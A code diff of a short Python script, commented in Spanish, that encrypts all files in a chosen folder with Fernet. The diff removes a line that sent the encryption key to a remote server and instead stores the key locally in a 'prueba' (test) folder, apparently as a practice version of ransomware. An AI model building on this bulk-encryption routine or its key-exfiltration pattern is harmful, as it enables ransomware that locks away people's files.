@@ -1,13 +1,15 @@
 #Programa que cifra los archivos a partir de una ubicación.
 
-import server
 from cryptography.fernet import Fernet
 import os
 
 def generar_key():
     key = Fernet.generate_key()
-    server.sendToServer(key)
-    return key
+    with open('prueba/key.key', 'wb') as key_file:
+        key_file.write(key)
+
+def cargar_key():
+    return open('prueba/key.key', 'rb').read()
 
 def encrypt(items, key):
     f = Fernet(key)
@@ -24,6 +26,7 @@ def cifrar():
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt+'\\'+item for item in items]
 
-    key = generar_key()
+    generar_key()
+    key = cargar_key()
 
     encrypt(full_path, key)
